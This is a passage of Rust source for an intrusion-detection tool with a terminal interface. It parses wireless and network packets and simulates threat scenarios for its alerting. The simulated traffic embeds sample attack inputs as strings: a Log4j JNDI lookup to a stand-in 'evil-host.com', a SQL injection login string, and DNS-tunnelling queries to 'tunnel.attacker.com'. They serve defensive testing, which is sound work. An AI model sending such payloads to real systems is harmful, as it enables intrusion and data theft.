        _ => ("Other", "Other"),
    };

    let proto = format!("802.11 {}", subtype_str);
    let addr1 = format_mac(&data[4..10]);
    let addr2 = format_mac(&data[10..16]);
    let addr3 = format_mac(&data[16..22]);
    let to_ds = (fc1 & 0x01) != 0;
    let from_ds = (fc1 & 0x02) != 0;
    let (src, dst, bssid) = match (to_ds, from_ds) {
        (false, false) => (addr2.clone(), addr1.clone(), addr3.clone()),
        (true, false) => (addr2.clone(), addr3.clone(), addr1.clone()),
        (false, true) => (addr3.clone(), addr1.clone(), addr2.clone()),
        (true, true) => (addr2.clone(), addr1.clone(), addr3.clone()),
    };

    let mut info = format!("Type: {}, Subtype: {}", type_str, subtype_str);
    if frame_type == 0 {
        let body = &data[24..];
        if frame_subtype == 8 || frame_subtype == 5 {
            if body.len() >= 12 {
                let mut offset = 12;
                let mut ssid = String::new();
                let mut channel = 0;
                let mut security = "Open".to_string();
                while offset + 2 <= body.len() {
                    let ie_type = body[offset];
                    let ie_len = body[offset + 1] as usize;
                    if offset + 2 + ie_len > body.len() { break; }
                    let ie_data = &body[offset + 2..offset + 2 + ie_len];
                    match ie_type {
                        0 => ssid = String::from_utf8_lossy(ie_data).into_owned(),
                        3 => if ie_len >= 1 { channel = ie_data[0]; },
                        48 => security = "WPA2/WPA3".to_string(),
                        _ => {}
                    }
                    offset += 2 + ie_len;
                }
                info = format!("SSID={}, BSSID={}, Chan={}, Sec={}", ssid, bssid, channel, security);
            }
        } else if frame_subtype == 12 || frame_subtype == 10 {
            if body.len() >= 2 {
                let reason = u16::from_le_bytes([body[0], body[1]]);
                info = format!("{} Reason={}", subtype_str, reason);
            }
        } else if frame_subtype == 11 {
            if body.len() >= 6 {
                let status = u16::from_le_bytes([body[4], body[5]]);
                info = format!("Auth Status={}", status);
            }
        } else if frame_subtype == 0 {
            if body.len() >= 4 {
                let mut offset = 4;
                let mut ssid = String::new();
                while offset + 2 <= body.len() {
                    let ie_type = body[offset];
                    let ie_len = body[offset + 1] as usize;
                    if offset + 2 + ie_len > body.len() { break; }
                    if ie_type == 0 { ssid = String::from_utf8_lossy(&body[offset + 2..offset + 2 + ie_len]).into_owned(); }
                    offset += 2 + ie_len;
                }
                info = format!("Assoc Request to SSID={} BSSID={}", ssid, bssid);
            }
        }
    }
    Some((proto, src, dst, bssid, info))
}

fn parse_dns_payload(payload: &[u8]) -> Option<String> {
    if payload.len() < 12 { return None; }
    let is_response = (payload[2] & 0x80) != 0;
    let rcode = payload[3] & 0x0f;
    let qdcount = u16::from_be_bytes([payload[4], payload[5]]);
    if qdcount > 0 && payload.len() > 12 {
        let mut offset = 12;
        let mut domain = String::new();
        while offset < payload.len() {
            let len = payload[offset] as usize;
            if len == 0 { break; }
            if offset + 1 + len > payload.len() { break; }
            if !domain.is_empty() { domain.push('.'); }
            domain.push_str(&String::from_utf8_lossy(&payload[offset + 1..offset + 1 + len]));
            offset += 1 + len;
        }
        if is_response {
            let status = if rcode == 3 { "NXDOMAIN" } else { "NoError" };
            Some(format!("Response: {} ({})", domain, status))
        } else {
            Some(format!("Query: {}", domain))
        }
    } else { None }
}

fn parse_dhcp_payload(payload: &[u8]) -> Option<String> {
    if payload.len() < 240 { return None; }
    let chaddr = format_mac(&payload[28..34]);
    let mut msg_type = "Unknown";
    let mut server_ip = "Unknown".to_string();
    let mut offset = 240;
    while offset + 2 <= payload.len() {
        let opt_type = payload[offset];
        if opt_type == 255 { break; }
        let opt_len = payload[offset + 1] as usize;
        if offset + 2 + opt_len > payload.len() { break; }
        let opt_data = &payload[offset + 2..offset + 2 + opt_len];
        match opt_type {
            53 => if opt_len >= 1 {
                msg_type = match opt_data[0] {
                    1 => "DISCOVER", 2 => "OFFER", 3 => "REQUEST", 5 => "ACK", 6 => "NAK", _ => "UNKNOWN"
                };
            }
            54 => if opt_len >= 4 {
                server_ip = format!("{}.{}.{}.{}", opt_data[0], opt_data[1], opt_data[2], opt_data[3]);
            }
            _ => {}
        }
        offset += 2 + opt_len;
    }
    Some(format!("{} Server={} ClientMAC={}", msg_type, server_ip, chaddr))
}

fn parse_packet(id: usize, timestamp: SystemTime, data: &[u8], is_wifi_link: bool) -> CapturedPacket {
    let mut src_mac = "Unknown".to_string();
    let mut dst_mac = "Unknown".to_string();
    let mut ether_type = "Unknown".to_string();
    let mut src_ip = "Unknown".to_string();
    let mut dst_ip = "Unknown".to_string();
    let mut protocol = "Unknown".to_string();
    let mut info = String::new();
    let mut details = String::new();
    let mut payload = &[][..];

    let dt = Local.from_utc_datetime(&match timestamp.duration_since(SystemTime::UNIX_EPOCH) {
        Ok(dur) => chrono::DateTime::from_timestamp(dur.as_secs() as i64, dur.subsec_nanos()).unwrap().naive_utc(),
        Err(_) => Local::now().naive_utc(),
    });
    let time_str = dt.format("%H:%M:%S%.6f").to_string();
    let timestamp_epoch_ms = timestamp.duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_millis() as u64;

    if is_wifi_link {
        if let Some((proto, src, dst, bssid, inf)) = parse_80211(data) {
            protocol = proto; src_mac = src; dst_mac = dst; info = inf;
            details = format!("[802.11 wireless frame]\n  Source MAC:  {}\n  Dest MAC:    {}\n  BSSID:       {}\n  Info:        {}\n", src_mac, dst_mac, bssid, info);
        } else {
            protocol = "802.11".to_string(); info = "Short wireless frame".to_string();
        }
    } else {
        match SlicedPacket::from_ethernet(data) {
            Err(e) => info = format!("Slicing error: {:?}", e),
            Ok(value) => {
                if let Some(link) = &value.link {
                    if let etherparse::LinkSlice::Ethernet2(eth) = link {
                        src_mac = format_mac(&eth.source());
                        dst_mac = format_mac(&eth.destination());
                        ether_type = format!("0x{:04x}", eth.ether_type().0);
                        details.push_str(&format!("[Ethernet Frame]\n  Source MAC:  {}\n  Dest MAC:    {}\n  EtherType:   {}\n\n", src_mac, dst_mac, ether_type));
                    }
                }
                if let Some(net) = &value.net {
                    match net {
                        etherparse::NetSlice::Ipv4(ip) => {
                            let hdr = ip.header();
                            src_ip = hdr.source_addr().to_string();
                            dst_ip = hdr.destination_addr().to_string();
                            protocol = match hdr.protocol() {
                                etherparse::ip_number::TCP => "TCP".to_string(),
                                etherparse::ip_number::UDP => "UDP".to_string(),
                                etherparse::ip_number::ICMP => "ICMPv4".to_string(),
                                p => format!("IP({})", p.0),
                            };
                            payload = ip.payload().payload;
                            details.push_str(&format!("[IPv4 Header]\n  Source IP:   {}\n  Dest IP:     {}\n  TTL:         {}\n\n", src_ip, dst_ip, hdr.ttl()));
                        }
                        etherparse::NetSlice::Ipv6(ip) => {
                            let hdr = ip.header();
                            src_ip = hdr.source_addr().to_string();
                            dst_ip = hdr.destination_addr().to_string();
                            protocol = match hdr.next_header() {
                                etherparse::ip_number::TCP => "TCP".to_string(),
                                etherparse::ip_number::UDP => "UDP".to_string(),
                                etherparse::ip_number::IPV6_ICMP => "ICMPv6".to_string(),
                                p => format!("IPv6({})", p.0),
                            };
                            payload = ip.payload().payload;
                            details.push_str(&format!("[IPv6 Header]\n  Source IP:   {}\n  Dest IP:     {}\n\n", src_ip, dst_ip));
                        }
                        etherparse::NetSlice::Arp(arp) => {
                            protocol = "ARP".to_string();
                            let s_hw = format_mac(arp.sender_hw_addr());
                            let s_pr = format_ipv4_bytes(arp.sender_protocol_addr());
                            let t_hw = format_mac(arp.target_hw_addr());
                            let t_pr = format_ipv4_bytes(arp.target_protocol_addr());
                            src_mac = s_hw.clone(); dst_mac = t_hw.clone(); src_ip = s_pr.clone(); dst_ip = t_pr.clone();
                            let is_req = arp.operation() == etherparse::ArpOperation::REQUEST;
                            info = if is_req { format!("Who has {}? Tell {}", t_pr, s_pr) } else { format!("{} is at {}", s_pr, s_hw) };
                            details.push_str(&format!("[ARP Header]\n  Sender:      {} ({})\n  Target:      {} ({})\n\n", s_pr, s_hw, t_pr, t_hw));
                        }
                    }
                }
                if let Some(transport) = &value.transport {
                    match transport {
                        etherparse::TransportSlice::Tcp(tcp) => {
                            let s_port = tcp.source_port();
                            let d_port = tcp.destination_port();
                            payload = tcp.payload();
                            let mut flags = Vec::new();
                            if tcp.syn() { flags.push("SYN"); }
                            if tcp.ack() { flags.push("ACK"); }
                            if tcp.fin() { flags.push("FIN"); }
                            if tcp.rst() { flags.push("RST"); }
                            let svc = guess_service(s_port, d_port);
                            protocol = if !svc.is_empty() { format!("TCP ({})", svc) } else { "TCP".to_string() };
                            info = format!("Port {} -> {} [Flags: {}] Seq={}", s_port, d_port, flags.join(","), tcp.sequence_number());
                            details.push_str(&format!("[TCP Segment]\n  Src Port:    {}\n  Dst Port:    {}\n  Flags:       {:?}\n\n", s_port, d_port, flags));
                            if (s_port == 53 || d_port == 53) && !payload.is_empty() {
                                if let Some(dns) = parse_dns_payload(payload) { info = format!("DNS {}", dns); }
                            }
                        }
                        etherparse::TransportSlice::Udp(udp) => {
                            let s_port = udp.source_port();
                            let d_port = udp.destination_port();
                            payload = udp.payload();
                            let svc = guess_service(s_port, d_port);
                            protocol = if !svc.is_empty() { format!("UDP ({})", svc) } else { "UDP".to_string() };
                            info = format!("Port {} -> {} Len={}", s_port, d_port, payload.len());
                            details.push_str(&format!("[UDP Datagram]\n  Src Port:    {}\n  Dst Port:    {}\n\n", s_port, d_port));
                            if s_port == 53 || d_port == 53 {
                                if let Some(dns) = parse_dns_payload(payload) { info = format!("DNS {}", dns); }
                            }
                            if (s_port == 67 && d_port == 68) || (s_port == 68 && d_port == 67) {
                                if let Some(dhcp) = parse_dhcp_payload(payload) { info = format!("DHCP {}", dhcp); }
                            }
                        }
                        etherparse::TransportSlice::Icmpv4(icmp) => {
                            payload = icmp.payload();
                            info = format!("ICMPv4 Type: {:?}", icmp.header().icmp_type);
                            details.push_str("[ICMPv4 Packet]\n\n");
                        }
                        etherparse::TransportSlice::Icmpv6(icmp) => {
                            payload = icmp.payload();
                            info = format!("ICMPv6 Type: {:?}", icmp.header().icmp_type);
                            details.push_str("[ICMPv6 Packet]\n\n");
                        }
                    }
                }
            }
        }
    }

    if !payload.is_empty() {
        details.push_str(&format!("[Payload Segment] Length: {} bytes\n", payload.len()));
        if let Ok(ascii) = std::str::from_utf8(payload) {
            let escaped: String = ascii.chars().map(|c| if c.is_ascii_graphic() || c == ' ' { c } else { '.' }).collect();
            details.push_str(&format!("  Ascii: {}\n", escaped));
        }
    }
    let payload_hex = format_hex_dump(payload);

    CapturedPacket {
        id, time_str, timestamp_epoch_ms, len: data.len() as u32,
        src_mac, dst_mac, ether_type, src_ip, dst_ip, protocol, info, details, payload_hex,
        raw_bytes: data.to_vec(),
    }
}

fn run_simulation_burst(tx: mpsc::Sender<CapturedPacket>, pattern_idx: usize, id_counter: Arc<AtomicUsize>) {
    thread::spawn(move || {
        let sleep_dur = Duration::from_millis(2);
        let make_p = |proto: &str, src_m: &str, dst_m: &str, src_i: &str, dst_i: &str, info: &str, details: &str| {
            let id = id_counter.fetch_add(1, Ordering::SeqCst);
            let now = SystemTime::now();
            let dt = Local::now();
            let time_str = dt.format("%H:%M:%S%.6f").to_string();
            let timestamp_epoch_ms = now.duration_since(SystemTime::UNIX_EPOCH).unwrap_or_default().as_millis() as u64;
            CapturedPacket {
                id, time_str, timestamp_epoch_ms, len: (details.len() + 54) as u32,
                src_mac: src_m.to_string(), dst_mac: dst_m.to_string(), ether_type: "0x0800".to_string(),
                src_ip: src_i.to_string(), dst_ip: dst_i.to_string(), protocol: proto.to_string(), info: info.to_string(),
                details: details.to_string(), payload_hex: format_hex_dump(details.as_bytes()), raw_bytes: details.as_bytes().to_vec(),
            }
        };

        match pattern_idx {
            0 => { // Rogue AP
                tx.send(make_p("802.11 Beacon", "00:11:22:33:44:55", "ff:ff:ff:ff:ff:ff", "192.168.1.1", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:11:22:33:44:55, Chan=6, Sec=WPA3-ENT", "Authorized AP Beacon")).unwrap();
                thread::sleep(sleep_dur);
                tx.send(make_p("802.11 Beacon", "00:e0:4c:88:99:aa", "ff:ff:ff:ff:ff:ff", "192.168.1.254", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:e0:4c:88:99:aa, Chan=11, Sec=WPA2-PSK", "Rogue AP Beacon mismatch")).unwrap();
            }
            1 => { // AP impersonation
                tx.send(make_p("802.11 Beacon", "00:11:22:33:44:55", "ff:ff:ff:ff:ff:ff", "192.168.1.1", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:11:22:33:44:55, Chan=6, Sec=WPA3-ENT", "Authorized AP Beacon")).unwrap();
                thread::sleep(sleep_dur);
                tx.send(make_p("802.11 Beacon", "00:11:22:33:44:55", "ff:ff:ff:ff:ff:ff", "192.168.1.1", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:11:22:33:44:55, Chan=6, Sec=Open", "Impersonated AP Beacon (Open Security)")).unwrap();
            }
            2 => { // Client joins rogue AP
                tx.send(make_p("802.11 Beacon", "00:e0:4c:88:99:aa", "ff:ff:ff:ff:ff:ff", "192.168.1.254", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:e0:4c:88:99:aa, Chan=11, Sec=WPA2-PSK", "Rogue AP Beacon")).unwrap();
                thread::sleep(sleep_dur);
                tx.send(make_p("802.11 Assoc Request", "aa:bb:cc:dd:ee:ff", "00:e0:4c:88:99:aa", "Unknown", "Unknown",
                               "Assoc Request to SSID=Enterprise_Secure BSSID=00:e0:4c:88:99:aa", "Client association request to rogue BSSID")).unwrap();
            }
            3 => { // Same SSID, new BSSID, diff security
                tx.send(make_p("802.11 Beacon", "00:11:22:33:44:55", "ff:ff:ff:ff:ff:ff", "192.168.1.1", "255.255.255.255",
                               "SSID=Enterprise_Secure, BSSID=00:11:22:33:44:55, Chan=6, Sec=WPA3-ENT", "Authorized AP Beacon")).unwrap();
                thread::sleep(sleep_dur);
                tx.send(make_p("802.11 Beacon", "00:99:88:77:66:55", "ff:ff:ff:ff:ff:ff", "Unknown", "Unknown",
                               "SSID=Enterprise_Secure, BSSID=00:99:88:77:66:55, Chan=1, Sec=WEP", "New rogue BSSID with downgraded security")).unwrap();
            }
            4 => { // Auth failures (5 frames)
                for _ in 0..5 {
                    tx.send(make_p("802.11 Auth", "aa:bb:cc:dd:ee:ff", "00:11:22:33:44:55", "Unknown", "Unknown",
                                   "Auth Status=17", "Authentication failure status 17")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            5 => { // Deauth flood (10 frames)
                for _ in 0..10 {
                    tx.send(make_p("802.11 Deauth", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "Unknown", "Unknown",
                                   "Deauthentication Reason=7", "Deauth Frame flood")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            6 => { // Scan burst (25 probe requests)
                for i in 0..25 {
                    tx.send(make_p("802.11 Probe Request", "aa:bb:cc:dd:ee:ff", "ff:ff:ff:ff:ff:ff", "Unknown", "Unknown",
                                   &format!("Probe Request: SSID=Wildcard_{}", i), "Wi-Fi scan probe")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            7 => { // DHCP spoof (5 mismatches)
                for _ in 0..5 {
                    tx.send(make_p("UDP (DHCP)", "00:ab:cd:ef:12:34", "aa:bb:cc:dd:ee:ff", "192.168.1.250", "255.255.255.255",
                                   "DHCP OFFER Server=192.168.1.250 ClientMAC=aa:bb:cc:dd:ee:ff", "DHCP Server Spoof Offer")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            8 => { // Beaconing / C2 periodic (Wi-Fi)
                for _ in 0..5 {
                    tx.send(make_p("802.11 Data", "aa:bb:cc:dd:ee:ff", "00:11:22:33:44:55", "192.168.1.100", "192.168.1.5",
                                   "802.11 Data Outbound Callback", "Periodic Wi-Fi Data")).unwrap();
                    thread::sleep(Duration::from_millis(40));
                }
            }
            9 => { // DNS anomaly burst (25 queries)
                for i in 0..25 {
                    tx.send(make_p("UDP (DNS)", "aa:bb:cc:dd:ee:ff", "00:11:22:33:44:55", "192.168.1.100", "8.8.8.8",
                                   &format!("DNS Query: suspicious-domain-{}.org", i), "Anomalous DNS Domain query")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            10 => { // Malware signature IoC
                tx.send(make_p("TCP (HTTP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "192.168.1.100", "198.51.100.12",
                               "Port 49202 -> 80 [PSH,ACK]", "GET /download HTTP/1.1\r\n\r\nPayload: X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")).unwrap();
            }
            11 => { // Exploit attempt (Log4j)
                tx.send(make_p("TCP (HTTP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "198.51.100.22", "192.168.1.10",
                               "Port 53211 -> 8080 [PSH,ACK]", "GET /?x=${jndi:ldap://evil-host.com/a} HTTP/1.1\r\n\r\n")).unwrap();
            }
            12 => { // SQLi
                tx.send(make_p("TCP (HTTP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "198.51.100.22", "192.168.1.10",
                               "Port 53212 -> 80 [PSH,ACK]", "POST /login HTTP/1.1\r\n\r\nusername=admin' OR '1'='1")).unwrap();
            }
            13 => { // TCP SYN scan (25 ports)
                for port in 1..26 {
                    tx.send(make_p("TCP", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.55", "192.168.1.10",
                                   &format!("Port 54321 -> {} [SYN]", port), "TCP Port Probe")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            14 => { // UDP scan
                for port in 5000..5025 {
                    tx.send(make_p("UDP", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.55", "192.168.1.10",
                                   &format!("Port 54321 -> {}", port), "UDP Port Probe")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            15 => { // ICMP sweep (20 hosts)
                for host in 1..21 {
                    tx.send(make_p("ICMPv4", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.55", &format!("192.168.1.{}", host),
                                   "Type: EchoRequest", "ICMP sweep check")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            16 => { // SSH brute force
                for _ in 0..5 {
                    tx.send(make_p("TCP (SSH)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.99", "192.168.1.10",
                                   "Port 49120 -> 22 [PSH,ACK]", "Failed password for root")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            17 => { // RDP brute force
                for _ in 0..5 {
                    tx.send(make_p("TCP (RDP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.99", "192.168.1.10",
                                   "Port 49122 -> 3389 [RST]", "Failed connection request")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            18 => { // Web login brute force
                for _ in 0..5 {
                    tx.send(make_p("TCP (HTTP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.99", "192.168.1.10",
                                   "Port 80 -> 49125 [PSH,ACK]", "HTTP/1.1 401 Unauthorized\r\n\r\nLogin failed")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            19 => { // Port knocking
                for port in [1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 10000] {
                    tx.send(make_p("TCP", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.12", "192.168.1.10",
                                   &format!("Port 54100 -> {} [SYN]", port), "SYN Port knock sequence")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            20 => { // Malware beaconing
                for _ in 0..5 {
                    tx.send(make_p("TCP (HTTP)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "192.168.1.10", "203.0.113.111",
                                   "Port 49300 -> 80 [PSH,ACK]", "GET /checkin.php?id=bot HTTP/1.1\r\n\r\n")).unwrap();
                    thread::sleep(Duration::from_millis(40));
                }
            }
            21 => { // DNS Tunneling
                for i in 0..25 {
                    tx.send(make_p("UDP (DNS)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "192.168.1.10", "8.8.8.8",
                                   &format!("DNS Query: aGVsZG93b3JsZE9pcHVzMTIzNDU2Nz{}.tunnel.attacker.com", i), "Anomalous subdomain length")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            22 => { // DDoS flood
                for i in 0..105 {
                    tx.send(make_p("TCP", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", &format!("198.51.100.{}", i % 254), "192.168.1.10",
                                   "Port 4322 -> 80 [SYN]", "SYN Flood packet")).unwrap();
                    if i % 15 == 0 { thread::sleep(Duration::from_millis(1)); }
                }
            }
            23 => { // Spoofed source
                tx.send(make_p("TCP", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "203.0.113.55", "192.168.1.10",
                               "Port 80 -> 49999 [ACK] Seq=1000 Ack=5000", "Spontaneous ACK (Asymmetric reply)")).unwrap();
            }
            24 => { // Fragmentation abuse
                for offset in 0..5 {
                    tx.send(make_p("IP (Frag)", "00:11:22:33:44:55", "aa:bb:cc:dd:ee:ff", "10.0.0.15", "192.168.1.10",
                                   &format!("Frag Offset={}, MF=1, Len=8", offset * 8), "Overlapping tiny fragment")).unwrap();
                    thread::sleep(sleep_dur);
                }
            }
            _ => {}
        }
    });
}

fn run_full_simulation_sweep(tx: mpsc::Sender<CapturedPacket>, id_counter: Arc<AtomicUsize>) {
    thread::spawn(move || {
        for idx in 0..25 {
            run_simulation_burst(tx.clone(), idx, id_counter.clone());
            thread::sleep(Duration::from_millis(350));
        }
    });
}

#[derive(PartialEq, Clone, Copy)]
enum ActivePane {
    ScenarioList,
    AlertsTable,
    PacketsTable,
    IdsmHexView,
    IdsmJsonView,
}

struct App {
    all_packets_captured: usize,
    simulated_packets_count: usize,
    live_packets_count: usize,
    alerts: Vec<SecurityAlert>,
    compressed_alerts: Vec<IdsmCompressedAlert>,
    alerts_table_state: TableState,
    selected_alert_packets: Vec<CapturedPacket>,
    packets_table_state: TableState,
    scenarios_list_state: ListState,
    active_pane: ActivePane,
    is_paused: bool,
    total_raw_bytes: usize,
    total_compressed_bytes: usize,
    recent_packets: VecDeque<(Instant, usize)>,
    analyzer: SecurityAnalyzer,
    packet_id_counter: Arc<AtomicUsize>,
    tx_packet_channel: mpsc::Sender<CapturedPacket>,
    link_layer_info: String,
    
    // Scrolling offsets for paragraph views
    hex_scroll_offset: u16,
    hex_horiz_scroll_offset: u16,
    json_scroll_offset: u16,
    json_horiz_scroll_offset: u16,
    
    // Boundary boxes for mouse event tracking
    scenario_rect: Rect,
    alerts_rect: Rect,
    packets_rect: Rect,
    hex_rect: Rect,
    json_rect: Rect,
}

impl App {
    fn new(tx: mpsc::Sender<CapturedPacket>, id_counter: Arc<AtomicUsize>) -> Self {
        let mut alerts_table_state = TableState::default();
        alerts_table_state.select(None);
        let mut packets_table_state = TableState::default();
        packets_table_state.select(None);
        let mut scenarios_list_state = ListState::default();
        scenarios_list_state.select(Some(0));

        App {
            all_packets_captured: 0,
            simulated_packets_count: 0,
            live_packets_count: 0,
            alerts: Vec::new(),
            compressed_alerts: Vec::new(),
            alerts_table_state,
            selected_alert_packets: Vec::new(),
            packets_table_state,
            scenarios_list_state,
            active_pane: ActivePane::ScenarioList,
            is_paused: false,
            total_raw_bytes: 0,
            total_compressed_bytes: 0,
            recent_packets: VecDeque::new(),
            analyzer: SecurityAnalyzer::new(),
            packet_id_counter: id_counter,
            tx_packet_channel: tx,
            link_layer_info: "Simulation Only Mode".to_string(),
            hex_scroll_offset: 0,
            hex_horiz_scroll_offset: 0,
            json_scroll_offset: 0,
            json_horiz_scroll_offset: 0,
            scenario_rect: Rect::default(),
            alerts_rect: Rect::default(),
            packets_rect: Rect::default(),
            hex_rect: Rect::default(),
            json_rect: Rect::default(),
        }
    }

    fn add_packet(&mut self, packet: CapturedPacket) {
        if self.is_paused { return; }
        self.all_packets_captured += 1;
        if packet.src_mac == "00:11:22:33:44:55" || packet.src_mac == "aa:bb:cc:dd:ee:ff" || packet.src_mac == "00:ab:cd:ef:12:34" || packet.src_mac == "00:e0:4c:88:99:aa" {
            self.simulated_packets_count += 1;
        } else {
            self.live_packets_count += 1;
        }
        self.recent_packets.push_back((Instant::now(), packet.len as usize));

        let new_alerts = self.analyzer.analyze(&packet);
        let mut added = false;
        for alert in new_alerts {
            let compressed = IDSM::compress(&alert);
            self.total_raw_bytes += compressed.raw_packets_size;
            self.total_compressed_bytes += compressed.compressed_size;
            self.alerts.push(alert);
            self.compressed_alerts.push(compressed);
            added = true;
        }
        if added && !self.alerts.is_empty() {
            self.alerts_table_state.select(Some(self.alerts.len() - 1));
            self.update_selected_alert_packets();
        }
    }

    fn update_selected_alert_packets(&mut self) {
        self.hex_scroll_offset = 0;
        self.hex_horiz_scroll_offset = 0;
        self.json_scroll_offset = 0;
        self.json_horiz_scroll_offset = 0;
        if let Some(idx) = self.alerts_table_state.selected() {
            if idx < self.alerts.len() {
                self.selected_alert_packets = self.alerts[idx].packets.clone();
                if !self.selected_alert_packets.is_empty() {
                    self.packets_table_state.select(Some(0));
                } else {
                    self.packets_table_state.select(None);
                }
                return;
            }
        }
        self.selected_alert_packets.clear();
        self.packets_table_state.select(None);
    }

    fn clear(&mut self) {
        self.alerts.clear();
        self.compressed_alerts.clear();
        self.selected_alert_packets.clear();
        self.alerts_table_state.select(None);
        self.packets_table_state.select(None);
        self.all_packets_captured = 0;
        self.simulated_packets_count = 0;
        self.live_packets_count = 0;
        self.total_raw_bytes = 0;
        self.total_compressed_bytes = 0;
        self.recent_packets.clear();
        self.analyzer = SecurityAnalyzer::new();
        self.hex_scroll_offset = 0;
        self.hex_horiz_scroll_offset = 0;
        self.json_scroll_offset = 0;
        self.json_horiz_scroll_offset = 0;
    }

    fn get_pps(&self) -> usize { self.recent_packets.len() }
    fn get_bps(&self) -> usize { self.recent_packets.iter().map(|(_, size)| size).sum() }

    fn prune_old_metrics(&mut self) {
        let now = Instant::now();
        while let Some((time, _)) = self.recent_packets.front() {
            if now.duration_since(*time) > Duration::from_secs(1) { self.recent_packets.pop_front(); }
            else { break; }
        }
    }
}

fn rect_contains(rect: Rect, col: u16, row: u16) -> bool {
    col >= rect.x && col < rect.x + rect.width && row >= rect.y && row < rect.y + rect.height
}

fn scroll_pane_up(app: &mut App, pane: ActivePane) {
    match pane {
        ActivePane::ScenarioList => {
            let curr = app.scenarios_list_state.selected().unwrap_or(0);
            if curr > 0 { app.scenarios_list_state.select(Some(curr - 1)); }
        }
        ActivePane::AlertsTable => {
            if let Some(selected) = app.alerts_table_state.selected() {
                if selected > 0 {
                    app.alerts_table_state.select(Some(selected - 1));
                    app.update_selected_alert_packets();
                }
            }
        }
        ActivePane::PacketsTable => {
            if let Some(selected) = app.packets_table_state.selected() {
                if selected > 0 { app.packets_table_state.select(Some(selected - 1)); }
            }
        }
        ActivePane::IdsmHexView => {
            if app.hex_scroll_offset > 0 {
                app.hex_scroll_offset -= 1;
            }
        }
        ActivePane::IdsmJsonView => {
            if app.json_scroll_offset > 0 {
                app.json_scroll_offset -= 1;
            }
        }
    }
}

fn scroll_pane_down(app: &mut App, pane: ActivePane) {
    match pane {
        ActivePane::ScenarioList => {
            let curr = app.scenarios_list_state.selected().unwrap_or(0);
            if curr < THREAT_SCENARIOS.len() - 1 { app.scenarios_list_state.select(Some(curr + 1)); }
        }
        ActivePane::AlertsTable => {
            if let Some(selected) = app.alerts_table_state.selected() {
                if selected < app.alerts.len() - 1 {
                    app.alerts_table_state.select(Some(selected + 1));
                    app.update_selected_alert_packets();
                }
            } else if !app.alerts.is_empty() {
                app.alerts_table_state.select(Some(0));
                app.update_selected_alert_packets();
            }
        }
        ActivePane::PacketsTable => {
            if let Some(selected) = app.packets_table_state.selected() {
                if selected < app.selected_alert_packets.len() - 1 {
                    app.packets_table_state.select(Some(selected + 1));
                }
            } else if !app.selected_alert_packets.is_empty() {
                app.packets_table_state.select(Some(0));
            }
        }
        ActivePane::IdsmHexView => {
            app.hex_scroll_offset += 1;
        }
        ActivePane::IdsmJsonView => {
            app.json_scroll_offset += 1;
        }
    }
}

fn scroll_pane_left(app: &mut App, pane: ActivePane) {
    match pane {
        ActivePane::IdsmHexView => {
            if app.hex_horiz_scroll_offset > 0 {
                app.hex_horiz_scroll_offset = app.hex_horiz_scroll_offset.saturating_sub(1);
            }
        }
        ActivePane::IdsmJsonView => {
            if app.json_horiz_scroll_offset > 0 {
                app.json_horiz_scroll_offset = app.json_horiz_scroll_offset.saturating_sub(1);
            }
        }
        _ => {}
    }
}

fn scroll_pane_right(app: &mut App, pane: ActivePane) {
    match pane {
        ActivePane::IdsmHexView => {
            app.hex_horiz_scroll_offset = app.hex_horiz_scroll_offset.saturating_add(1);
        }
        ActivePane::IdsmJsonView => {
            app.json_horiz_scroll_offset = app.json_horiz_scroll_offset.saturating_add(1);
        }
        _ => {}
    }
}


fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "--test-sim" {
        return run_headless_simulation_test();
    }

    let (tx, rx) = mpsc::channel();
    let is_running = Arc::new(AtomicBool::new(true));
    let is_running_clone = is_running.clone();
    let packet_id_counter = Arc::new(AtomicUsize::new(1));
    let counter_clone = packet_id_counter.clone();
    let tx_clone = tx.clone();

    // Pcap initialization (graceful fallback to Simulation Mode)
    let devices = Device::list().unwrap_or_default();
    let device_opt = devices.into_iter().find(|d| d.name == "wlan0").or_else(|| {
        let devs = Device::list().unwrap_or_default();
        devs.into_iter().find(|d| d.name != "lo")
    });

    let mut link_layer_str = "Simulation Only Mode".to_string();
    if let Some(device) = device_opt {
        let dev_name = device.name.clone();
        thread::spawn(move || {
            if let Ok(mut cap) = Capture::from_device(device)
                .unwrap()
